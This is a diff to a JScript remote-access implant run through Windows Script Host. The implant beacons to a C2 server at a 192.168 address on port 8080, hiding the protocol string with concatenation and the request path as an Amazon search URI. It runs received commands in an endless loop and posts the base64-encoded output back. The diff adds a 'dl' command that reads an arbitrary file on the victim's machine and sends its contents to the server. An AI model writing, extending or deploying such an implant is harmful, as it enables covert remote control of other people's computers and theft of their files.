@@ -1,6 +1,6 @@
 //Define variables
 var ho = "192.168."
-var me = "12.27"
+var me = "0.189"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -106,8 +106,8 @@ function b64d(data) {
 //Main
 while(true)
 {
-  try
-  {
+  //try
+  //{
     var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'"}';
     var serverMsg = post(home, checkin);
 	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
@@ -116,6 +116,7 @@ while(true)
 
     if(jsObject.cmnd)
     {
+		var rettype = "retval"
 	    //kill
 	    if(jsObject.cmnd == "quit") {
         if(fso.FileExists(selfpath)) {
@@ -155,6 +156,21 @@ while(true)
           fso.DeleteFile(temp + "\\" + id + ".txt", true)
         }
       }
+	  
+	  	else if(jsObject.cmnd.split(" ")[0] == "dl") {
+	      var array = jsObject.cmnd.split(" ")
+		  array.shift() //Cuts off the first element in the array
+		  var filepath = array.join(" ")
+	      if(fso.FileExists(filepath)) {
+		    fd = fso.OpenTextFile(filepath)
+		    retval = fd.ReadAll()
+		    fd.close()
+		    rettype = "dl"
+		}
+		else {
+		  retval = "[!] Could not read file: " + filepath
+		}
+	  }
 
 	    //credit to nate and 0sum <3
 	    else {
@@ -169,13 +185,14 @@ while(true)
 		      retval = "[!] Error getting output"
 	      }
       }
-      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","retval":"'+b64e(retval)+'"}';
+      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","'+rettype+'":"'+b64e(retval)+'"}';
       jsObject.cmnd = ""
       post(home, resp)
     }
-  }
-  catch (e) {
-    WScript.Sleep(sleepytime);
-  }
+  //}
+  //catch (e) {
+  //  WScript.Sleep(sleepytime);
+  //}
   WScript.Sleep(sleepytime);
 }
+
